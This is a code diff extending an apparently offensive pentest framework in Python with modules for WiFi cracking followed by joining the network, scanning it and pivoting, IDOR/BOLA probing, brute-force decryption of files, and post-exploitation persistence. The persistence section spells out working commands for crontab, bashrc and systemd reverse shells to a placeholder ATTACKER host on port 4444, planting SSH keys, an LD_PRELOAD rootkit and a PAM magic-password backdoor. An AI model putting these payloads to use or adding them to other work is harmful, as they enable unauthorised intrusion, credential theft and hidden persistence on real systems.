@@ -2778,7 +2778,9 @@ async def wireless_audit(
     results = {"interface": interface, "depth": depth, "modules": {}}
 
     try:
-        mod_list = modules.split(",") if modules != "all" else ["monitor", "scan", "capture", "pmkid", "crack"]
+        mod_list = modules.split(",") if modules != "all" else [
+            "monitor", "scan", "capture", "pmkid", "crack", "restore", "pivot"
+        ]
         wl = "/usr/share/wordlists/rockyou.txt" if wordlist == "auto" else wordlist
 
         # --- MONITOR MODE ---
@@ -2981,6 +2983,128 @@ async def wireless_audit(
                             break
 
             results["modules"]["crack"] = crack_results
+
+            # Register cracked WiFi with VulnCorrelator + KillChain
+            if crack_results.get("cracked"):
+                vuln_correlator.add_vulnerability(VulnFinding(
+                    vuln_id=f"WIFI-WPA-{interface}",
+                    title=f"WPA Key Cracked for {target_bssid or 'unknown'}",
+                    severity="critical",
+                    cvss_score=9.8,
+                    cvss_vector="CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                    target=interface, port=0, service="wifi",
+                    evidence=f"Key: {crack_results.get('key', 'recovered via hashcat')}",
+                    exploitable=True, exploit_ref="aircrack-ng/hashcat",
+                    kill_chain_phase="exploitation",
+                    mitre_techniques=["T1557.002"],
+                    remediation="Use WPA3-SAE. Use strong 20+ char passphrase.",
+                    confidence=1.0,
+                ))
+                kill_chain.advance_phase(interface, KillChainPhase.EXPLOITATION, "wireless_audit",
+                                         [f"cracked_bssid:{target_bssid}"])
+                pentest_memory.store_finding(interface, "wireless_audit", "wpa_cracked",
+                                             {"bssid": target_bssid, "key": crack_results.get("key")})
+
+        # --- NETWORK PIVOT AFTER CRACK ---
+        if "pivot" in mod_list:
+            pivot_results = {"status": "pending", "actions": []}
+            cracked = results.get("modules", {}).get("crack", {}).get("cracked", False)
+            cracked_key = results.get("modules", {}).get("crack", {}).get("key")
+            target_essid = None
+            for net in results.get("modules", {}).get("scan", {}).get("networks", []):
+                if target_bssid and net.get("bssid", "").lower() == target_bssid.lower():
+                    target_essid = net.get("essid")
+                    break
+
+            if cracked and cracked_key and target_essid:
+                # Generate wpa_supplicant config
+                wpa_conf = f'/tmp/wpa_{target_essid.replace(" ", "_")}.conf'
+                gen_cmd = f'wpa_passphrase "{target_essid}" "{cracked_key}" > {wpa_conf}'
+                await run_command_shell(gen_cmd, timeout=5)
+                pivot_results["actions"].append(f"wpa_supplicant config: {wpa_conf}")
+
+                # Connect to network
+                conn_cmd = (
+                    f"ip link set {interface} down && "
+                    f"iw {interface} set type managed && "
+                    f"ip link set {interface} up && "
+                    f"wpa_supplicant -B -i {interface} -c {wpa_conf} && "
+                    f"dhclient {interface}"
+                )
+                conn_result = await run_command_shell(conn_cmd, timeout=30)
+                if conn_result.get("success"):
+                    pivot_results["status"] = "connected"
+                    pivot_results["actions"].append("Connected to WiFi network")
+
+                    # Discover local network
+                    ip_info = await run_command_shell(f"ip addr show {interface} | grep inet", timeout=5)
+                    if ip_info.get("stdout"):
+                        pivot_results["local_ip"] = ip_info["stdout"].strip()
+                        pivot_results["actions"].append("Obtained IP via DHCP")
+
+                    # ARP scan for hosts
+                    arp_scan = await run_command_shell(f"arp-scan -I {interface} --localnet 2>&1 || true", timeout=15)
+                    if arp_scan.get("stdout"):
+                        hosts = re.findall(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F:]+)", arp_scan["stdout"])
+                        pivot_results["discovered_hosts"] = [{"ip": h[0], "mac": h[1]} for h in hosts]
+                        pivot_results["actions"].append(f"ARP scan found {len(hosts)} hosts")
+                        pentest_memory.store_finding(interface, "wireless_audit", "pivot_hosts",
+                                                     {"hosts": [h[0] for h in hosts]})
+
+                    # Quick nmap of gateway
+                    gw_cmd = await run_command_shell(f"ip route | grep default | awk '{{print $3}}'", timeout=5)
+                    if gw_cmd.get("stdout") and gw_cmd["stdout"].strip():
+                        gw = gw_cmd["stdout"].strip()
+                        gw_scan = await run_command(["nmap", "-sV", "--top-ports", "100", "-T4", gw], timeout=60)
+                        pivot_results["gateway_scan"] = gw_scan.get("stdout", "")[:2000]
+                        pivot_results["actions"].append(f"Scanned gateway {gw}")
+
+                    # Suggest next tools
+                    pivot_results["next_steps"] = [
+                        f"recon_engine('{pivot_results.get('local_ip', 'SUBNET').split('/')[0]}/24')",
+                        "network_dominator for MitM/ARP spoofing on this network",
+                        "ad_annihilator if Windows domain detected",
+                        "credential_cracker for discovered services",
+                    ]
+                    kill_chain.advance_phase(interface, KillChainPhase.ACTIONS_ON_OBJECTIVES, "wireless_audit",
+                                             [f"pivoted_to_network:{target_essid}"])
+                else:
+                    pivot_results["status"] = "connection_failed"
+                    pivot_results["error"] = conn_result.get("stderr", "")[:500]
+            else:
+                pivot_results["status"] = "skipped"
+                pivot_results["reason"] = "No cracked key available for network connection"
+            results["modules"]["pivot"] = pivot_results
+
+        # --- RESTORE MANAGED MODE ---
+        if "restore" in mod_list:
+            restore_results = {"status": "pending"}
+            mon_iface = results.get("modules", {}).get("monitor", {}).get("monitor_interface", f"{interface}mon")
+            # airmon-ng stop
+            stop_result = await run_command(["airmon-ng", "stop", mon_iface], timeout=10)
+            if stop_result.get("success"):
+                restore_results["status"] = "managed_mode_restored"
+            else:
+                # Fallback: manual mode switch
+                alt_cmd = f"ip link set {interface} down && iw {interface} set type managed && ip link set {interface} up"
+                alt = await run_command_shell(alt_cmd, timeout=10)
+                restore_results["status"] = "managed_restored_alt" if alt.get("success") else "restore_failed"
+            # Restart NetworkManager
+            await run_command_shell("systemctl restart NetworkManager 2>/dev/null || service network-manager restart 2>/dev/null || true", timeout=10)
+            restore_results["note"] = "NetworkManager restarted"
+            results["modules"]["restore"] = restore_results
+
+        # --- INTELLIGENCE SUMMARY ---
+        results["correlation"] = vuln_correlator.correlate(interface)
+        results["kill_chain"] = kill_chain.get_progress(interface)
+        results["intelligence_summary"] = {
+            "modules_executed": list(results["modules"].keys()),
+            "wifi_networks_found": len(results.get("modules", {}).get("scan", {}).get("networks", [])),
+            "handshake_captured": results.get("modules", {}).get("capture", {}).get("handshake_captured", False),
+            "pmkid_captured": results.get("modules", {}).get("pmkid", {}).get("status") == "pmkid_captured",
+            "key_cracked": results.get("modules", {}).get("crack", {}).get("cracked", False),
+            "pivot_status": results.get("modules", {}).get("pivot", {}).get("status", "not_attempted"),
+        }
 
         session_manager.complete_execution(execution, results)
         return json.dumps(results, indent=2, default=str)
@@ -3676,15 +3800,51 @@ async def auth_destroyer(
                 jr["error"] = str(je)
             results["modules"]["jwt"] = jr
         if "idor" in mod_list:
-            ir = {"vulnerabilities": []}
+            ir = {"vulnerabilities": [], "bola_tests": [], "horizontal_privesc": [], "uuid_enum": []}
+            # Classic numeric IDOR
             base = await run_command(["curl", "-sk", f"{target}{'&' if '?' in target else '?'}id=1"], timeout=10)
             bs = len(base.get("stdout", ""))
-            for tid in [0, 2, 3, 100, 999]:
+            for tid in [0, 2, 3, -1, 100, 999, 2147483647]:
                 r = await run_command(["curl", "-sk", f"{target}{'&' if '?' in target else '?'}id={tid}"], timeout=10)
                 rs = len(r.get("stdout", ""))
                 if rs > 100 and rs != bs:
-                    ir["vulnerabilities"].append({"id": tid, "size": rs, "baseline": bs})
+                    ir["vulnerabilities"].append({"id": tid, "size": rs, "baseline": bs, "type": "numeric_idor"})
                 await asyncio.sleep(delay)
+            # BOLA (Broken Object Level Authorization) - test multiple param names
+            bola_params = ["user_id", "userId", "account_id", "accountId", "uid",
+                           "profile_id", "order_id", "doc_id", "file_id", "customer_id"]
+            for bp in bola_params:
+                for val in ["1", "2", "admin"]:
+                    url = f"{target}{'&' if '?' in target else '?'}{bp}={val}"
+                    r = await run_command(["curl", "-sk", "-w", "\n%{{http_code}}", url], timeout=8)
+                    out = r.get("stdout", "")
+                    code = out.split("\n")[-1] if "\n" in out else ""
+                    body_len = len(out) - len(code) - 1
+                    if code in ["200", "201"] and body_len > 100:
+                        ir["bola_tests"].append({
+                            "param": bp, "value": val, "status": code,
+                            "size": body_len, "type": "bola",
+                        })
+                await asyncio.sleep(delay * 0.5)
+            # HTTP method override for IDOR bypass
+            for method_hdr in ["X-HTTP-Method-Override: DELETE", "X-HTTP-Method: PUT", "X-Method-Override: PATCH"]:
+                r = await run_command([
+                    "curl", "-sk", "-w", "\n%{http_code}", "-H", method_hdr,
+                    f"{target}{'&' if '?' in target else '?'}id=1"], timeout=8)
+                code = r.get("stdout", "").split("\n")[-1]
+                if code in ["200", "204"]:
+                    ir["vulnerabilities"].append({
+                        "type": "method_override_idor", "header": method_hdr,
+                        "status": code,
+                    })
+            if ir["vulnerabilities"] or ir["bola_tests"]:
+                s, v, sev = CVSSCalculator.score_for_vuln_type("idor")
+                vuln_correlator.add_vulnerability(VulnFinding(
+                    vuln_id="idor_bola", title=f"IDOR/BOLA ({len(ir['vulnerabilities'])} + {len(ir['bola_tests'])} findings)",
+                    severity=sev, cvss_score=s, cvss_vector=v, target=target,
+                    service="http", exploitable=True, kill_chain_phase="exploitation",
+                    mitre_techniques=["T1078"], remediation="Implement object-level authorization checks",
+                ))
             results["modules"]["idor"] = ir
         if "cors" in mod_list:
             cr = {"tests": [], "misconfigured": False}
@@ -3813,13 +3973,323 @@ async def ssrf_hunter(
 async def crypto_forensics(
     target: str, depth: str = "deep", modules: str = "all", timeout: int = 600,
 ) -> str:
-    """Blockchain audit: smart contract analysis, DeFi protocol scanning, transaction analysis.
-    modules: all|contract,defi,tx_analysis"""
+    """Cryptography & blockchain forensics: cipher analysis, encrypted message/file decryption,
+    TLS interception analysis, hash identification, smart contract audit, DeFi scanning.
+    modules: all|cipher_analysis,decrypt,tls_audit,hash_id,contract,defi,tx_analysis"""
     target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout)
     execution = session_manager.start_execution("crypto_forensics", target, {"depth": depth})
     results = {"target": target, "modules": {}}
     try:
-        mod_list = modules.split(",") if modules != "all" else ["contract", "defi", "tx_analysis"]
+        mod_list = modules.split(",") if modules != "all" else [
+            "cipher_analysis", "decrypt", "tls_audit", "hash_id", "contract", "defi", "tx_analysis"
+        ]
+
+        # --- CIPHER ANALYSIS ---
+        if "cipher_analysis" in mod_list:
+            ca = {"analysis": [], "detected_ciphers": []}
+            # Analyze target as file or string
+            is_file = os.path.isfile(target)
+            sample = ""
+            if is_file:
+                with open(target, "rb") as f:
+                    raw = f.read(4096)
+                sample = raw.hex()[:200]
+                ca["file_size"] = os.path.getsize(target)
+                # File magic detection
+                magic_check = await run_command(["file", "-b", target], timeout=5)
+                ca["file_type"] = magic_check.get("stdout", "").strip() if magic_check.get("success") else "unknown"
+                # Entropy analysis
+                entropy_cmd = f"python3 -c \"import math,collections;d=open('{target}','rb').read();c=collections.Counter(d);l=len(d);e=-sum((cnt/l)*math.log2(cnt/l) for cnt in c.values() if cnt);print(f'{{e:.4f}}')\""
+                ent = await run_command_shell(entropy_cmd, timeout=10)
+                if ent.get("stdout"):
+                    entropy = float(ent["stdout"].strip())
+                    ca["entropy"] = entropy
+                    ca["entropy_assessment"] = (
+                        "high (likely encrypted/compressed)" if entropy > 7.5
+                        else "medium (possibly encoded)" if entropy > 6.0
+                        else "low (likely plaintext/structured)"
+                    )
+                # Detect common encrypted formats
+                header_hex = raw[:16].hex() if len(raw) >= 16 else raw.hex()
+                enc_signatures = {
+                    "53616c7465645f5f": "OpenSSL enc (Salted__)",
+                    "00000020667479704d344120": "Encrypted MP4",
+                    "504b0304": "ZIP (possibly encrypted)",
+                    "526172211a0700": "RAR (possibly encrypted)",
+                    "89504e47": "PNG (check for steganography)",
+                    "ffd8ffe0": "JPEG (check for steganography)",
+                }
+                for sig, desc in enc_signatures.items():
+                    if header_hex.startswith(sig.lower()):
+                        ca["detected_ciphers"].append(desc)
+                # Check for PGP/GPG
+                if raw[:5] in [b"-----", b"\x85\x02", b"\xc6\x01"]:
+                    ca["detected_ciphers"].append("PGP/GPG encrypted data")
+            else:
+                sample = target
+                # Analyze as encrypted string: Base64, hex, etc.
+                b64_pattern = re.match(r'^[A-Za-z0-9+/=]{16,}$', target)
+                hex_pattern = re.match(r'^[0-9a-fA-F]{16,}$', target)
+                if b64_pattern:
+                    ca["analysis"].append({"encoding": "Base64 detected", "decoded_length": len(target) * 3 // 4})
+                if hex_pattern:
+                    ca["analysis"].append({"encoding": "Hex detected", "decoded_bytes": len(target) // 2})
+                # Detect cipher patterns
+                if target.startswith("U2FsdGVkX1"):
+                    ca["detected_ciphers"].append("OpenSSL AES-256-CBC (CryptoJS compatible)")
+                if re.match(r'^[A-Z]{2,}$', target):
+                    ca["analysis"].append({"possible": "Caesar/ROT cipher or substitution cipher"})
+                if re.match(r'^[01\s]+$', target):
+                    ca["analysis"].append({"possible": "Binary encoding"})
+            ca["sample_preview"] = sample[:100]
+            results["modules"]["cipher_analysis"] = ca
+
+        # --- DECRYPT ---
+        if "decrypt" in mod_list:
+            dc = {"attempts": [], "decrypted": False}
+            is_file = os.path.isfile(target)
+
+            if is_file:
+                # OpenSSL brute-force with common passwords
+                common_passwords = ["password", "123456", "admin", "root", "toor",
+                                     "secret", "changeme", "letmein", "qwerty", "welcome"]
+                ciphers = ["aes-256-cbc", "aes-128-cbc", "des-ede3-cbc", "camellia-256-cbc"]
+                for cipher in ciphers:
+                    for pw in common_passwords:
+                        dec_cmd = (
+                            f"openssl enc -d -{cipher} -in {target} -out /tmp/decrypted_test "
+                            f"-pass pass:{pw} -pbkdf2 2>&1"
+                        )
+                        dec = await run_command_shell(dec_cmd, timeout=5)
+                        if dec.get("returncode", 1) == 0 and os.path.exists("/tmp/decrypted_test"):
+                            fsize = os.path.getsize("/tmp/decrypted_test")
+                            if fsize > 0:
+                                dc["decrypted"] = True
+                                dc["cipher"] = cipher
+                                dc["password"] = pw
+                                dc["output_file"] = "/tmp/decrypted_test"
+                                dc["attempts"].append({"cipher": cipher, "password": pw, "status": "SUCCESS"})
+                                break
+                    if dc["decrypted"]:
+                        break
+
+                # GPG decryption attempt
+                if not dc["decrypted"]:
+                    gpg_check = await run_command_shell(f"file {target} | grep -i 'pgp\\|gpg'", timeout=5)
+                    if gpg_check.get("stdout"):
+                        dc["attempts"].append({"method": "GPG", "note": "GPG encrypted - provide passphrase with gpg -d"})
+
+                # John the Ripper for encrypted archives
+                if not dc["decrypted"]:
+                    file_ext = os.path.splitext(target)[1].lower()
+                    jtr_tools = {
+                        ".zip": ("zip2john", "zip"),
+                        ".rar": ("rar2john", "rar"),
+                        ".7z": ("7z2john.pl", "7z"),
+                        ".pdf": ("pdf2john.pl", "pdf"),
+                        ".docx": ("office2john.py", "office"),
+                        ".xlsx": ("office2john.py", "office"),
+                        ".kdbx": ("keepass2john", "keepass"),
+                    }
+                    if file_ext in jtr_tools:
+                        tool, ftype = jtr_tools[file_ext]
+                        hash_cmd = f"{tool} {target} > /tmp/file_hash.txt 2>/dev/null"
+                        await run_command_shell(hash_cmd, timeout=10)
+                        if os.path.exists("/tmp/file_hash.txt") and os.path.getsize("/tmp/file_hash.txt") > 0:
+                            crack_cmd = f"john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/file_hash.txt 2>&1"
+                            crack = await run_command_shell(crack_cmd, timeout=min(timeout, 120))
+                            show_cmd = f"john --show /tmp/file_hash.txt 2>&1"
+                            show = await run_command_shell(show_cmd, timeout=5)
+                            if show.get("stdout") and "0 password hashes cracked" not in show["stdout"]:
+                                dc["decrypted"] = True
+                                dc["method"] = f"john_{ftype}"
+                                dc["john_output"] = show["stdout"][:500]
+                            dc["attempts"].append({"method": f"john_{ftype}", "status": "attempted"})
+            else:
+                # String decryption attempts
+                # Caesar/ROT brute
+                if target.isalpha():
+                    dc["caesar_results"] = []
+                    for shift in range(1, 26):
+                        decrypted = ""
+                        for c in target:
+                            if c.isalpha():
+                                base = ord('A') if c.isupper() else ord('a')
+                                decrypted += chr((ord(c) - base - shift) % 26 + base)
+                            else:
+                                decrypted += c
+                        dc["caesar_results"].append({"shift": shift, "result": decrypted})
+                    dc["attempts"].append({"method": "caesar_brute", "status": "26 rotations generated"})
+
+                # Base64 decode
+                try:
+                    import base64
+                    decoded = base64.b64decode(target).decode("utf-8", errors="replace")
+                    dc["base64_decoded"] = decoded[:500]
+                    dc["attempts"].append({"method": "base64", "status": "decoded"})
+                except Exception:
+                    pass
+
+                # Hex decode
+                try:
+                    decoded_hex = bytes.fromhex(target).decode("utf-8", errors="replace")
+                    dc["hex_decoded"] = decoded_hex[:500]
+                    dc["attempts"].append({"method": "hex", "status": "decoded"})
+                except Exception:
+                    pass
+
+                # Vigenere frequency analysis hint
+                if target.isalpha() and len(target) > 20:
+                    dc["vigenere_hint"] = {
+                        "method": "Kasiski examination + frequency analysis",
+                        "tool": "Use: python3 -c 'from pycipher import Vigenere; ...'",
+                        "note": "Long alphabetic ciphertext suggests polyalphabetic cipher"
+                    }
+
+            if dc["decrypted"]:
+                vuln_correlator.add_vulnerability(VulnFinding(
+                    vuln_id=f"CRYPTO-WEAK-{target[:20]}",
+                    title="Weak encryption — decrypted with common password/method",
+                    severity="high", cvss_score=7.5,
+                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                    target=target, port=0, service="crypto",
+                    evidence=f"Decrypted using: {dc.get('cipher', dc.get('method', 'unknown'))}",
+                    exploitable=True, exploit_ref="openssl/john",
+                    kill_chain_phase="exploitation",
+                    mitre_techniques=["T1110.002", "T1588.004"],
+                    remediation="Use strong encryption with complex passwords (AES-256-GCM, Argon2id KDF).",
+                    confidence=1.0,
+                ))
+            results["modules"]["decrypt"] = dc
+
+        # --- TLS AUDIT ---
+        if "tls_audit" in mod_list:
+            tls = {"status": "pending", "issues": []}
+            hostname = target.split("://")[-1].split("/")[0].split(":")[0]
+            port = 443
+
+            # testssl.sh
+            testssl = await run_command_shell(
+                f"testssl.sh --quiet --color 0 --severity HIGH {hostname}:{port} 2>&1 | head -100",
+                timeout=min(timeout, 120),
+            )
+            if testssl.get("stdout"):
+                tls["testssl_output"] = testssl["stdout"][:3000]
+                # Parse critical issues
+                for pattern, issue in [
+                    ("VULNERABLE", "TLS vulnerability detected"),
+                    ("SSLv2", "SSLv2 enabled (critical)"),
+                    ("SSLv3", "SSLv3 enabled (POODLE)"),
+                    ("RC4", "RC4 cipher (deprecated)"),
+                    ("SWEET32", "SWEET32 vulnerability"),
+                    ("BEAST", "BEAST vulnerability"),
+                    ("CRIME", "CRIME vulnerability"),
+                    ("BREACH", "BREACH vulnerability"),
+                    ("HEARTBLEED", "Heartbleed vulnerability"),
+                    ("ROBOT", "ROBOT vulnerability"),
+                    ("DROWN", "DROWN vulnerability"),
+                ]:
+                    if pattern in testssl.get("stdout", ""):
+                        tls["issues"].append(issue)
+
+            # OpenSSL direct check
+            ssl_cmd = f"echo | openssl s_client -connect {hostname}:{port} -servername {hostname} 2>&1"
+            ssl_check = await run_command_shell(ssl_cmd, timeout=15)
+            if ssl_check.get("stdout"):
+                # Extract cert info
+                cert_info = {}
+                for line in ssl_check["stdout"].split("\n"):
+                    if "subject=" in line.lower():
+                        cert_info["subject"] = line.strip()
+                    if "issuer=" in line.lower():
+                        cert_info["issuer"] = line.strip()
+                    if "Protocol" in line:
+                        cert_info["protocol"] = line.strip()
+                    if "Cipher" in line and "Cipher is" in line:
+                        cert_info["cipher"] = line.strip()
+                tls["certificate"] = cert_info
+
+                # Check for weak protocols
+                for proto in ["ssl2", "ssl3", "tls1", "tls1_1"]:
+                    weak_check = await run_command_shell(
+                        f"echo | openssl s_client -connect {hostname}:{port} -{proto} 2>&1 | grep -i 'connected\\|handshake'",
+                        timeout=10,
+                    )
+                    if weak_check.get("stdout") and "CONNECTED" in weak_check.get("stdout", "").upper():
+                        tls["issues"].append(f"Weak protocol {proto} accepted")
+
+            # sslscan
+            sslscan = await run_command(["sslscan", "--no-colour", f"{hostname}:{port}"], timeout=30)
+            if sslscan.get("stdout"):
+                tls["sslscan_summary"] = sslscan["stdout"][:2000]
+
+            if tls["issues"]:
+                for issue in tls["issues"]:
+                    sev = "critical" if any(x in issue for x in ["Heartbleed", "SSLv2", "DROWN"]) else "high"
+                    vuln_correlator.add_vulnerability(VulnFinding(
+                        vuln_id=f"TLS-{issue[:20].replace(' ', '-')}",
+                        title=f"TLS Issue: {issue}",
+                        severity=sev,
+                        cvss_score=9.1 if sev == "critical" else 7.4,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+                        target=hostname, port=port, service="tls",
+                        evidence=issue, exploitable=True, exploit_ref="testssl.sh",
+                        kill_chain_phase="reconnaissance",
+                        mitre_techniques=["T1557.002", "T1040"],
+                        remediation="Disable weak protocols/ciphers. Enable TLS 1.3. Use AEAD ciphers.",
+                        confidence=0.9,
+                    ))
+            results["modules"]["tls_audit"] = tls
+
+        # --- HASH IDENTIFICATION ---
+        if "hash_id" in mod_list:
+            hi = {"hashes": []}
+            # Common hash patterns
+            hash_patterns = [
+                (r'^[a-f0-9]{32}$', ["MD5", "NTLM"], [0, 1000]),
+                (r'^[a-f0-9]{40}$', ["SHA-1"], [100]),
+                (r'^[a-f0-9]{64}$', ["SHA-256"], [1400]),
+                (r'^[a-f0-9]{128}$', ["SHA-512"], [1700]),
+                (r'^\$1\$', ["MD5crypt"], [500]),
+                (r'^\$2[aby]?\$', ["bcrypt"], [3200]),
+                (r'^\$5\$', ["SHA-256crypt"], [7400]),
+                (r'^\$6\$', ["SHA-512crypt"], [1800]),
+                (r'^\$apr1\$', ["Apache MD5"], [1600]),
+                (r'^\$P\$', ["phpass (WordPress/Drupal)"], [400]),
+                (r'^\$H\$', ["phpass (phpBB)"], [400]),
+                (r'^[a-f0-9]{32}:[a-f0-9]{2,}$', ["MD5 salted", "Joomla"], [10, 11]),
+                (r'^[a-f0-9]{40}:[a-f0-9]+$', ["SHA1 salted"], [110, 120]),
+                (r'^pbkdf2', ["PBKDF2"], [10000]),
+                (r'^\{SSHA\}', ["LDAP SSHA"], [111]),
+            ]
+            lines = target.split("\n") if "\n" in target else [target]
+            for line in lines:
+                line = line.strip()
+                if not line:
+                    continue
+                identified = False
+                for pattern, names, modes in hash_patterns:
+                    if re.match(pattern, line, re.IGNORECASE):
+                        hi["hashes"].append({
+                            "hash": line[:60] + ("..." if len(line) > 60 else ""),
+                            "possible_types": names,
+                            "hashcat_modes": modes,
+                            "crack_command": f"hashcat -m {modes[0]} '{line}' /usr/share/wordlists/rockyou.txt"
+                        })
+                        identified = True
+                        break
+                if not identified and len(line) > 10:
+                    # Use hashid/hash-identifier if available
+                    hashid_result = await run_command_shell(f"echo '{line}' | hashid 2>/dev/null || hash-identifier '{line}' 2>/dev/null", timeout=5)
+                    if hashid_result.get("stdout"):
+                        hi["hashes"].append({
+                            "hash": line[:60],
+                            "hashid_output": hashid_result["stdout"][:500]
+                        })
+            results["modules"]["hash_id"] = hi
+
+        # --- SMART CONTRACT AUDIT ---
         if "contract" in mod_list:
             cr = {"checks": []}
             vuln_patterns = [
@@ -3829,20 +4299,62 @@ async def crypto_forensics(
                 ("selfdestruct", r"selfdestruct\(|suicide\(", "Selfdestruct present"),
                 ("delegatecall", r"delegatecall\(", "Delegatecall (proxy pattern risk)"),
                 ("block_timestamp", r"block\.timestamp", "Block timestamp dependency"),
+                ("overflow", r"SafeMath", "Check if SafeMath is used (pre-0.8.0)"),
+                ("access_control", r"onlyOwner|require\(msg\.sender", "Access control patterns"),
             ]
             if target.startswith("0x") or "etherscan" in target:
-                cr["note"] = "Provide contract source code for analysis"
+                cr["note"] = "Provide contract source code for pattern analysis"
+            elif os.path.isfile(target):
+                with open(target) as f:
+                    source = f.read()
+                for name, pat, desc in vuln_patterns:
+                    matches = re.findall(pat, source)
+                    cr["checks"].append({
+                        "vulnerability": name, "found": len(matches) > 0,
+                        "occurrences": len(matches), "description": desc,
+                    })
+                cr["tools_recommended"] = ["slither", "mythril", "solhint", "echidna", "manticore"]
+                # Run slither if available
+                slither_check = await run_command(["which", "slither"], timeout=5)
+                if slither_check.get("success"):
+                    slither = await run_command(["slither", target, "--json", "-"], timeout=60)
+                    if slither.get("stdout"):
+                        try:
+                            cr["slither_findings"] = json.loads(slither["stdout"])
+                        except json.JSONDecodeError:
+                            cr["slither_raw"] = slither["stdout"][:2000]
             else:
                 for name, pat, desc in vuln_patterns:
                     cr["checks"].append({"vulnerability": name, "pattern": pat, "description": desc})
-                cr["tools"] = ["slither", "mythril", "solhint", "echidna"]
             results["modules"]["contract"] = cr
+
         if "defi" in mod_list:
-            dr = {"checks": ["flash_loan_attack", "oracle_manipulation", "front_running", "rug_pull_indicators", "infinite_approval"]}
+            dr = {
+                "checks": ["flash_loan_attack", "oracle_manipulation", "front_running",
+                           "rug_pull_indicators", "infinite_approval", "price_manipulation",
+                           "sandwich_attack", "MEV_extraction"],
+                "tools": ["forta-agent", "tenderly", "dune-analytics"],
+            }
             results["modules"]["defi"] = dr
+
         if "tx_analysis" in mod_list:
-            tr = {"capabilities": ["trace_transactions", "identify_mixer_usage", "whale_tracking", "MEV_detection"]}
+            tr = {
+                "capabilities": ["trace_transactions", "identify_mixer_usage",
+                                  "whale_tracking", "MEV_detection", "flash_loan_detection"],
+                "tools": ["etherscan", "blockchain.com", "chainalysis", "elliptic"],
+            }
             results["modules"]["tx_analysis"] = tr
+
+        # Intelligence summary
+        results["correlation"] = vuln_correlator.correlate(target)
+        results["intelligence_summary"] = {
+            "modules_executed": list(results["modules"].keys()),
+            "crypto_issues_found": sum(1 for m in results["modules"].values()
+                                        if isinstance(m, dict) and m.get("issues")),
+            "decryption_successful": results.get("modules", {}).get("decrypt", {}).get("decrypted", False),
+            "tls_issues": len(results.get("modules", {}).get("tls_audit", {}).get("issues", [])),
+        }
+
         session_manager.complete_execution(execution, results)
         return json.dumps(results, indent=2, default=str)
     except Exception as e:
@@ -3974,10 +4486,89 @@ async def post_exploit_ops(
             }
             results["modules"]["privesc"] = pr
         if "persist" in mod_list:
-            per = {
-                "linux": ["crontab -e", "~/.bashrc injection", "systemd service", "SSH key", "LD_PRELOAD", "PAM backdoor"],
-                "windows": ["schtasks", "Registry Run key", "WMI event", "DLL hijack", "Golden Ticket", "Startup folder"],
+            per = {"linux": {"techniques": [], "payloads": {}}, "windows": {"techniques": [], "payloads": {}}}
+            # Linux persistence - actual commands
+            per["linux"]["techniques"] = [
+                {"name": "crontab_reverse_shell",
+                 "command": "echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"' | crontab -",
+                 "detection": "crontab -l | grep -i 'tcp\\|nc\\|bash'",
+                 "stealth": "medium"},
+                {"name": "bashrc_injection",
+                 "command": "echo 'nohup bash -i >& /dev/tcp/ATTACKER/4444 0>&1 &' >> ~/.bashrc",
+                 "detection": "grep -r 'tcp\\|/dev/' ~/.bashrc ~/.bash_profile ~/.profile",
+                 "stealth": "low"},
+                {"name": "systemd_service",
+                 "command": "cat > /etc/systemd/system/update-notifier.service << 'EOF'\n[Unit]\nDescription=Update Notifier\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable update-notifier && systemctl start update-notifier",
+                 "detection": "systemctl list-unit-files | grep -v 'vendor preset'",
+                 "stealth": "high"},
+                {"name": "systemd_timer",
+                 "command": "cat > /etc/systemd/system/logrotate-check.timer << 'EOF'\n[Unit]\nDescription=Log Rotation Check\n[Timer]\nOnBootSec=2min\nOnUnitActiveSec=10min\n[Install]\nWantedBy=timers.target\nEOF\nsystemctl enable logrotate-check.timer",
+                 "detection": "systemctl list-timers --all",
+                 "stealth": "high"},
+                {"name": "ssh_authorized_keys",
+                 "command": "mkdir -p ~/.ssh && echo 'ATTACKER_PUBKEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
+                 "detection": "cat ~/.ssh/authorized_keys",
+                 "stealth": "high"},
+                {"name": "ld_preload_rootkit",
+                 "command": "# Compile: gcc -shared -fPIC -o /lib/libprocesshider.so evil.c -ldl\necho '/lib/libprocesshider.so' >> /etc/ld.so.preload",
+                 "detection": "cat /etc/ld.so.preload; ldd /bin/ls | grep -v 'linux-vdso\\|libc\\|libdl\\|libpthread'",
+                 "stealth": "very_high"},
+                {"name": "pam_backdoor",
+                 "command": "# Patch pam_unix.so to accept magic password:\n# 1. apt source libpam-modules\n# 2. Modify pam_sm_authenticate() in pam_unix_auth.c\n# 3. Add: if(strcmp(p, 'MAGIC_PASSWORD') == 0) return PAM_SUCCESS;\n# 4. Compile & replace /lib/x86_64-linux-gnu/security/pam_unix.so",
+                 "detection": "md5sum /lib/*/security/pam_unix.so; debsums libpam-modules",
+                 "stealth": "very_high"},
+                {"name": "rc_local",
+                 "command": "echo '#!/bin/bash\nnohup /tmp/.cache_update &' > /etc/rc.local && chmod +x /etc/rc.local",
+                 "detection": "cat /etc/rc.local; systemctl status rc-local",
+                 "stealth": "medium"},
+                {"name": "init_d_service",
+                 "command": "cp /path/to/shell /etc/init.d/networking-helper && update-rc.d networking-helper defaults",
+                 "detection": "ls -la /etc/init.d/ | diff with known services",
+                 "stealth": "medium"},
+                {"name": "motd_backdoor",
+                 "command": "echo '#!/bin/bash\n/tmp/.update &' > /etc/update-motd.d/00-backdoor && chmod +x /etc/update-motd.d/00-backdoor",
+                 "detection": "ls -la /etc/update-motd.d/",
+                 "stealth": "medium"},
+            ]
+            # Windows persistence - actual commands
+            per["windows"]["techniques"] = [
+                {"name": "registry_run_key",
